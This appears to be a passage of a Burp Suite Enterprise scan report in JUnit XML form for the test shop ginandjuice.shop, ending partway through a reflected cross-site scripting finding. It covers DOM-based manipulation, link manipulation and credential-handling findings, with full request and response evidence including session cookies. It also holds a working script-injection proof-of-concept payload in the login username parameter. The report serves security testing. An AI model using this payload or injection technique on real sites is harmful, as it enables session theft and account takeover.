+Cookie: session=uAMS6Iacx8VxAM4YZ6UsGbzkZyICKnMH; AWSALB=Mw6zWeWo7Zj8G8z9vtMZigNCSx8c+NQQYDn2ifOPks6rlw9PyejxpgLjrWO2S6F8cJuzBDc4UnyIe6DcE+SiXnGwk7U0y9sMxiOhaK/IFWmvQd2UaYszhGemiwph; AWSALBCORS=Mw6zWeWo7Zj8G8z9vtMZigNCSx8c+NQQYDn2ifOPks6rlw9PyejxpgLjrWO2S6F8cJuzBDc4UnyIe6DcE+SiXnGwk7U0y9sMxiOhaK/IFWmvQd2UaYszhGemiwph; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6ImtkM3IxMGhhOFBKRVNaNzAifQ==
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:06:32 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 9367
+Set-Cookie: AWSALB=Ask041iAS2VUgXmGvProG2PpGPdkUd3HeSYf7v3puCq7H8Xc8xRdAEb+6FQU00honhToPoPSw39kOOcs4D/mf6WLvbe0uyzhD/rgBrdPZWzUxHKyuJGcHArMOAdo; Expires=Thu, 14 Sep 2023 11:06:32 GMT; Path=/
+Set-Cookie: AWSALBCORS=Ask041iAS2VUgXmGvProG2PpGPdkUd3HeSYf7v3puCq7H8Xc8xRdAEb+6FQU00honhToPoPSw39kOOcs4D/mf6WLvbe0uyzhD/rgBrdPZWzUxHKyuJGcHArMOAdo; Expires=Thu, 14 Sep 2023 11:06:32 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip<script>
+var searchText = 'g6znb8eawh';
+document.getElementById('searchBar').value = searchText;
+</script>Snip
+
+Static analysis:
+
+
+Data is read from g6znb8eawh and passed to the 'value' property of a DOM element
+via the following statements:
+
+
+
+
+- var searchText = 'g6znb8eawh';
+- document.getElementById('searchBar').value = searchText;
+
+
+
+
+Dynamic analysis:
+
+
+Data is read from g6znb8eawh and passed to input.value.
+
+
+
+
+- 
+The previous value reached the sink:
+
+qnjekll5xj
+
+
+
+- 
+The stack trace at source was:
+
+at _0x217cd0 (<anonymous>:1:255280)
+at HTMLInputElement.set [as value] (<anonymous>:1:493424)
+at https://ginandjuice.shop/catalog?searchTerm=g6znb8eawh:72:76
+
+
+
+- 
+The stack trace at the sink was:
+
+at Object.aoIqt (<anonymous>:1:106209)
+at Object.wHPpa (<anonymous>:1:479984)
+at HTMLInputElement.set [as value] (<anonymous>:1:493468)
+at https://ginandjuice.shop/catalog?searchTerm=g6znb8eawh:72:76
+
+
+
+
+
+
+
+
+References
+    
+- Web Security Academy: DOM data manipulation (https://portswigger.net/web-security/dom-based/dom-data-manipulation)
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CAPEC-153: Input Data Manipulation (https://capec.mitre.org/data/definitions/153.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Link manipulation (reflected DOM-based)">
+            <failure message="Link manipulation (reflected DOM-based) found at https://ginandjuice.shop/catalog" type="Low"><![CDATA[
+Severity: Low
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /catalog
+
+
+Issue Detail
+The application may be vulnerable to reflected DOM-based link manipulation.
+
+The value of the searchTerm request parameter is copied into a JavaScript string literal. The payload g6znb8eawh was submitted in the searchTerm parameter.
+
+The string containing the payload is then passed to element.setAttribute.href.
+
+Issue Background
+Reflected DOM-based vulnerabilities arise when data is copied from a request and echoed into the application's immediate response within a part of the DOM that is then processed in an unsafe way by a client-side script. An attacker can leverage the reflection to control a part of the response (for example, a JavaScript string) that can be used to trigger the DOM-based vulnerability.
+
+DOM-based link manipulation  arises when a script writes controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response. An attacker may be able to leverage this to perform various attacks, including:
+
+
+
+- Causing the user to redirect to an arbitrary external URL, to facilitate a phishing attack.
+- Causing the user to submit sensitive form data to a server controlled by the attacker.
+- Causing the user to perform an unintended action within the application, by changing the file or query string associated with a link.
+- Bypassing browser anti-XSS defenses by injecting on-site links containing XSS exploits, since browser anti-XSS defenses typically do not operate on on-site links.
+
+Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.
+
+
+Issue Remediation
+The most effective way to avoid DOM-based link manipulation vulnerabilities is not to dynamically set the target URLs of links or forms using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a link target. In general, this is best achieved by using a whitelist of URLs that are permitted link targets, and strictly validating the target against this list before setting the link target.
+
+
+Evidence
+Request:
+GET /catalog?searchTerm=g6znb8eawh HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=uAMS6Iacx8VxAM4YZ6UsGbzkZyICKnMH; AWSALB=Mw6zWeWo7Zj8G8z9vtMZigNCSx8c+NQQYDn2ifOPks6rlw9PyejxpgLjrWO2S6F8cJuzBDc4UnyIe6DcE+SiXnGwk7U0y9sMxiOhaK/IFWmvQd2UaYszhGemiwph; AWSALBCORS=Mw6zWeWo7Zj8G8z9vtMZigNCSx8c+NQQYDn2ifOPks6rlw9PyejxpgLjrWO2S6F8cJuzBDc4UnyIe6DcE+SiXnGwk7U0y9sMxiOhaK/IFWmvQd2UaYszhGemiwph; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6ImtkM3IxMGhhOFBKRVNaNzAifQ==
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:06:32 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 9367
+Set-Cookie: AWSALB=Ask041iAS2VUgXmGvProG2PpGPdkUd3HeSYf7v3puCq7H8Xc8xRdAEb+6FQU00honhToPoPSw39kOOcs4D/mf6WLvbe0uyzhD/rgBrdPZWzUxHKyuJGcHArMOAdo; Expires=Thu, 14 Sep 2023 11:06:32 GMT; Path=/
+Set-Cookie: AWSALBCORS=Ask041iAS2VUgXmGvProG2PpGPdkUd3HeSYf7v3puCq7H8Xc8xRdAEb+6FQU00honhToPoPSw39kOOcs4D/mf6WLvbe0uyzhD/rgBrdPZWzUxHKyuJGcHArMOAdo; Expires=Thu, 14 Sep 2023 11:06:32 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip
+
+Dynamic analysis:
+
+
+Data is read from g6znb8eawh and passed to element.setAttribute.href.
+
+
+
+
+- 
+The previous value reached the sink:
+
+https://ginandjuice.shop/catalog?searchTerm=q7aq51nsmv
+
+
+
+- 
+The stack trace at source was:
+
+at _0x217cd0 (<anonymous>:1:255280)
+at Object.JYCxJ (<anonymous>:1:109679)
+at _0x3878e6 (<anonymous>:1:539951)
+at Object.KPeSV (<anonymous>:1:99234)
+at _0x4b5c9d (<anonymous>:1:466338)
+at Object.vkicD (<anonymous>:1:103343)
+at Object.MNKgw (<anonymous>:1:432691)
+at HTMLAnchorElement.setAttribute (<anonymous>:1:468839)
+at ga (https://ginandjuice.shop/resources/js/angular_1-7-7.js:170:271)
+at https://ginandjuice.shop/resources/js/angular_1-7-7.js:276:111
+at https://ginandjuice.shop/resources/js/angular_1-7-7.js:348:504
+
+
+
+- 
+The stack trace at the sink was:
+
+at Object.lbDRJ (<anonymous>:1:107180)
+at _0x3878e6 (<anonymous>:1:540000)
+at Object.KPeSV (<anonymous>:1:99234)
+at _0x4b5c9d (<anonymous>:1:466338)
+at Object.vkicD (<anonymous>:1:103343)
+at Object.MNKgw (<anonymous>:1:432691)
+at HTMLAnchorElement.setAttribute (<anonymous>:1:468839)
+at ga (https://ginandjuice.shop/resources/js/angular_1-7-7.js:170:271)
+at https://ginandjuice.shop/resources/js/angular_1-7-7.js:276:111
+at https://ginandjuice.shop/resources/js/angular_1-7-7.js:348:504
+
+
+
+
+
+
+
+
+References
+    
+- Web Security Academy: Link manipulation (DOM-based) (https://portswigger.net/web-security/dom-based/link-manipulation)
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CAPEC-153: Input Data Manipulation (https://capec.mitre.org/data/definitions/153.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Link manipulation (reflected DOM-based)">
+            <failure message="Link manipulation (reflected DOM-based) found at https://ginandjuice.shop/catalog" type="Low"><![CDATA[
+Severity: Low
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /catalog
+
+
+Issue Detail
+The application may be vulnerable to reflected DOM-based link manipulation.
+
+The value of the searchTerm request parameter is copied into a JavaScript string literal. The payload g6znb8eawh was submitted in the searchTerm parameter.
+
+The string containing the payload is then passed to element.setAttribute.href.
+
+Issue Background
+Reflected DOM-based vulnerabilities arise when data is copied from a request and echoed into the application's immediate response within a part of the DOM that is then processed in an unsafe way by a client-side script. An attacker can leverage the reflection to control a part of the response (for example, a JavaScript string) that can be used to trigger the DOM-based vulnerability.
+
+DOM-based link manipulation  arises when a script writes controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response. An attacker may be able to leverage this to perform various attacks, including:
+
+
+
+- Causing the user to redirect to an arbitrary external URL, to facilitate a phishing attack.
+- Causing the user to submit sensitive form data to a server controlled by the attacker.
+- Causing the user to perform an unintended action within the application, by changing the file or query string associated with a link.
+- Bypassing browser anti-XSS defenses by injecting on-site links containing XSS exploits, since browser anti-XSS defenses typically do not operate on on-site links.
+
+Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.
+
+
+Issue Remediation
+The most effective way to avoid DOM-based link manipulation vulnerabilities is not to dynamically set the target URLs of links or forms using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a link target. In general, this is best achieved by using a whitelist of URLs that are permitted link targets, and strictly validating the target against this list before setting the link target.
+
+
+Evidence
+Request:
+GET /catalog?searchTerm=g6znb8eawh HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=uAMS6Iacx8VxAM4YZ6UsGbzkZyICKnMH; AWSALB=Mw6zWeWo7Zj8G8z9vtMZigNCSx8c+NQQYDn2ifOPks6rlw9PyejxpgLjrWO2S6F8cJuzBDc4UnyIe6DcE+SiXnGwk7U0y9sMxiOhaK/IFWmvQd2UaYszhGemiwph; AWSALBCORS=Mw6zWeWo7Zj8G8z9vtMZigNCSx8c+NQQYDn2ifOPks6rlw9PyejxpgLjrWO2S6F8cJuzBDc4UnyIe6DcE+SiXnGwk7U0y9sMxiOhaK/IFWmvQd2UaYszhGemiwph; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6ImtkM3IxMGhhOFBKRVNaNzAifQ==
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:06:32 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 9367
+Set-Cookie: AWSALB=Ask041iAS2VUgXmGvProG2PpGPdkUd3HeSYf7v3puCq7H8Xc8xRdAEb+6FQU00honhToPoPSw39kOOcs4D/mf6WLvbe0uyzhD/rgBrdPZWzUxHKyuJGcHArMOAdo; Expires=Thu, 14 Sep 2023 11:06:32 GMT; Path=/
+Set-Cookie: AWSALBCORS=Ask041iAS2VUgXmGvProG2PpGPdkUd3HeSYf7v3puCq7H8Xc8xRdAEb+6FQU00honhToPoPSw39kOOcs4D/mf6WLvbe0uyzhD/rgBrdPZWzUxHKyuJGcHArMOAdo; Expires=Thu, 14 Sep 2023 11:06:32 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip
+
+Dynamic analysis:
+
+
+Data is read from g6znb8eawh and passed to element.setAttribute.href.
+
+
+
+
+- 
+The previous value reached the sink:
+
+/catalog?category=Accessories&searchTerm=bn7dl2wabn
+
+
+
+- 
+The stack trace at source was:
+
+at _0x217cd0 (<anonymous>:1:255280)
+at Object.JYCxJ (<anonymous>:1:109679)
+at _0x3878e6 (<anonymous>:1:539951)
+at Object.KPeSV (<anonymous>:1:99234)
+at _0x4b5c9d (<anonymous>:1:466338)
+at Object.vkicD (<anonymous>:1:103343)
+at Object.MNKgw (<anonymous>:1:432691)
+at HTMLAnchorElement.setAttribute (<anonymous>:1:468839)
+at setValueForProperty (https://ginandjuice.shop/resources/js/react-dom.development.js:842:14)
+at setInitialDOMProperties (https://ginandjuice.shop/resources/js/react-dom.development.js:9730:9)
+at setInitialProperties (https://ginandjuice.shop/resources/js/react-dom.development.js:9931:5)
+at finalizeInitialChildren (https://ginandjuice.shop/resources/js/react-dom.development.js:10960:5)
+at completeWork (https://ginandjuice.shop/resources/js/react-dom.development.js:22203:19)
+at completeUnitOfWork (https://ginandjuice.shop/resources/js/react-dom.development.js:26603:18)
+at performUnitOfWork (https://ginandjuice.shop/resources/js/react-dom.development.js:26578:7)
+at workLoopSync (https://ginandjuice.shop/resources/js/react-dom.development.js:26476:7)
+at renderRootSync (https://ginandjuice.shop/resources/js/react-dom.development.js:26444:9)
+at performConcurrentWorkOnRoot (https://ginandjuice.shop/resources/js/react-dom.development.js:25748:76)
+at workLoop (https://ginandjuice.shop/resources/js/react.development.js:2653:36)
+at flushWork (https://ginandjuice.shop/resources/js/react.development.js:2626:16)
+at MessagePort.performWorkUntilDeadline (https://ginandjuice.shop/resources/js/react.development.js:2920:23)
+
+
+
+- 
+The stack trace at the sink was:
+
+at Object.lbDRJ (<anonymous>:1:107180)
+at _0x3878e6 (<anonymous>:1:540000)
+at Object.KPeSV (<anonymous>:1:99234)
+at _0x4b5c9d (<anonymous>:1:466338)
+at Object.vkicD (<anonymous>:1:103343)
+at Object.MNKgw (<anonymous>:1:432691)
+at HTMLAnchorElement.setAttribute (<anonymous>:1:468839)
+at setValueForProperty (https://ginandjuice.shop/resources/js/react-dom.development.js:842:14)
+at setInitialDOMProperties (https://ginandjuice.shop/resources/js/react-dom.development.js:9730:9)
+at setInitialProperties (https://ginandjuice.shop/resources/js/react-dom.development.js:9931:5)
+at finalizeInitialChildren (https://ginandjuice.shop/resources/js/react-dom.development.js:10960:5)
+at completeWork (https://ginandjuice.shop/resources/js/react-dom.development.js:22203:19)
+at completeUnitOfWork (https://ginandjuice.shop/resources/js/react-dom.development.js:26603:18)
+at performUnitOfWork (https://ginandjuice.shop/resources/js/react-dom.development.js:26578:7)
+at workLoopSync (https://ginandjuice.shop/resources/js/react-dom.development.js:26476:7)
+at renderRootSync (https://ginandjuice.shop/resources/js/react-dom.development.js:26444:9)
+at performConcurrentWorkOnRoot (https://ginandjuice.shop/resources/js/react-dom.development.js:25748:76)
+at workLoop (https://ginandjuice.shop/resources/js/react.development.js:2653:36)
+at flushWork (https://ginandjuice.shop/resources/js/react.development.js:2626:16)
+at MessagePort.performWorkUntilDeadline (https://ginandjuice.shop/resources/js/react.development.js:2920:23)
+
+
+
+- 
+This was triggered by a message event.
+
+
+
+
+
+
+
+
+
+References
+    
+- Web Security Academy: Link manipulation (DOM-based) (https://portswigger.net/web-security/dom-based/link-manipulation)
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CAPEC-153: Input Data Manipulation (https://capec.mitre.org/data/definitions/153.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/cart" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/cart" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/cart" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/cart" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/cart" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=3" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=9" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=13" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=15" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=10" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=14" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=11" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=18" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=8" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=16" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=2" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=17" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=6" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=5" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=7" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=12" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=1" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product?productId=4" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/product/stock" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/catalog/subscribe" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="4" name="https://ginandjuice.shop:443/login" tests="4">
+        <testcase name="Password field with autocomplete enabled">
+            <failure message="Password field with autocomplete enabled found at https://ginandjuice.shop/login" type="Low"><![CDATA[
+Severity: Low
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /login
+
+
+Issue Detail
+The page contains a form with the following action URL:
+- https://ginandjuice.shop/login
+The form contains the following password field with autocomplete enabled:
+- password
+
+
+Issue Background
+Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.
+
+The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. 
+
+
+Issue Remediation
+To prevent browsers from storing credentials entered into HTML forms, include the attribute autocomplete="off" within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).
+
+Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.
+
+
+Evidence
+Request:
+POST /login HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Cookie: session=tdrdqr82kTQf3FHwh7mJ2RXAgghnKMn0; AWSALB=uHEyDZugjwtu85OAPWSVUaz2Ous1++sNZ7V4YFqb/uZ33/wqy+YUysr6srjNEAFiO87+iA2jRZ+NGhEMZX000ofhvG6ISPloiaX1T4TNtZQ96QBxZNBnX6dK+nJu; AWSALBCORS=uHEyDZugjwtu85OAPWSVUaz2Ous1++sNZ7V4YFqb/uZ33/wqy+YUysr6srjNEAFiO87+iA2jRZ+NGhEMZX000ofhvG6ISPloiaX1T4TNtZQ96QBxZNBnX6dK+nJu
+
+csrf=QhyxvPhLnaKHKC2yj0TklMfNjSMPWOh5&username=875703
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:18 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7801
+Set-Cookie: AWSALB=sL5irfqgT3bUoYxRkTY9kyW1rBRAvr4XUSt3m9QfHorZ4qRKcnMPTDMNtAmQOIJI6GLW6EfkE1p0gRSsSzq+i2JKLpkkW/dFWhSC1Rzo3b252lBiI9dAGpBhsgiu; Expires=Thu, 14 Sep 2023 10:58:18 GMT; Path=/
+Set-Cookie: AWSALBCORS=sL5irfqgT3bUoYxRkTY9kyW1rBRAvr4XUSt3m9QfHorZ4qRKcnMPTDMNtAmQOIJI6GLW6EfkE1p0gRSsSzq+i2JKLpkkW/dFWhSC1Rzo3b252lBiI9dAGpBhsgiu; Expires=Thu, 14 Sep 2023 10:58:18 GMT; Path=/; SameSite=None; Secure
+X-Backend: 6ee1d000-9aff-4799-bfe5-704c0280a506
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip<section>
+<form class=login-form method=POST action="/login">
+<input required type="hidden" name="csrf" value="zS3EpI9uh73YDywxUF5Joro9exVkibVZ">Snip</span>
+<input tabindex=0 placeholder="Password" required type=password name="password" autofocus>
+<button class=button type=submit>Snip
+
+
+
+Vulnerability Classifications
+
+- CWE-200: Information Exposure (https://cwe.mitre.org/data/definitions/200.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Input returned in response (reflected)">
+            <failure message="Input returned in response (reflected) found at https://ginandjuice.shop/login" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /login
+
+
+Issue Detail
+The value of the username request parameter is copied into the application's response.
+
+Issue Background
+Reflection of input arises when data is copied from a request and echoed into the application's immediate response.
+Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. 
+
+
+Evidence
+Request:
+POST /login HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Cookie: session=g6Gc59O9XG0QXDA2lpP9iQmXGUISAvuY; AWSALB=owCPp6IgdBfB6aQrT/wmSjiCmCKKIaHg7moyq5vfNVFPZxKGuuZzy+DHyD8G4jk8c8dv3/hAf2UNqAPCbNlYRMrDViHraPnks+ytzmTxUFc2ASs2kPgvaBWpAM8S; AWSALBCORS=owCPp6IgdBfB6aQrT/wmSjiCmCKKIaHg7moyq5vfNVFPZxKGuuZzy+DHyD8G4jk8c8dv3/hAf2UNqAPCbNlYRMrDViHraPnks+ytzmTxUFc2ASs2kPgvaBWpAM8S
+
+csrf=zKY78ZswNDJGsymbSrVXzcGLofYOOol1&username=875703civ1imjmaj
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:03:58 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7811
+Set-Cookie: AWSALB=mgyiv8hxADLBFWQw6cXz+HOwWiBjZfsBLURPnAH5Fd62Qwo5GMoV8beDZK+1X7e5f9aH04a2r/pKiyw0IHLzN9WhifwxYjZcwoGFzgllDeHgmcwQ3/+QOqGErMDw; Expires=Thu, 14 Sep 2023 11:03:58 GMT; Path=/
+Set-Cookie: AWSALBCORS=mgyiv8hxADLBFWQw6cXz+HOwWiBjZfsBLURPnAH5Fd62Qwo5GMoV8beDZK+1X7e5f9aH04a2r/pKiyw0IHLzN9WhifwxYjZcwoGFzgllDeHgmcwQ3/+QOqGErMDw; Expires=Thu, 14 Sep 2023 11:03:58 GMT; Path=/; SameSite=None; Secure
+X-Backend: 77f6218a-0cf1-40a4-8590-b355c8c38596
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip<script>
+var username = '875703civ1imjmaj';
+document.getElementById('usernameInput').value = username;
+</script>Snip
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Cross-site scripting (reflected)">
+            <failure message="Cross-site scripting (reflected) found at https://ginandjuice.shop/login" type="High"><![CDATA[
+Severity: High
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /login
+
+
+Issue Detail
+The value of the username request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. The payload 47132';alert(1)//649 was submitted in the username parameter. This input was echoed unmodified in the application's response.
+
+This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.
+
+Issue Background
+Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.
+
+The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.
+
+Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).
+
